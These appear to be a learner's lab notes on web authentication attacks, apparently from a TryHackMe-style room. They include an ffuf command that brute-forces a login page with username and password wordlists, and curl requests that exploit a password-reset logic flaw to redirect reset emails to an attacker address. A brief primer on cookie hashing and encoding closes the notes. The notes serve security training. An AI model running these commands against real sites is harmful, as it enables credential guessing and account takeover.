Related: [[Username enumeration]] | [[OSCP/Web Hacking/Tools/ffuf]] | [[Insecure direct object references (IDOR)]]




Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page

http://10.112.176.71/customers/login

**Note: If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.**

ffuf -w /home/kali/Desktop/valid_usernames.txt:W1 -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt:W2 -u http://10.112.176.71/customers/login -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -fc 200


**LOGIC FLAW**

1.

curl 'http://10.112.176.71/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'


2.

curl 'http://10.114.182.37/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

3.

curl 'http://10.114.182.37/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'


**Cookie tampering**

**Hashing**  

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as [https://crackstation.net/ (opens in new tab)](https://crackstation.net/) keep databases of billions of hashes and their original strings.

**Encoding**

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.  
  
Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

https://www.base64decode.org/
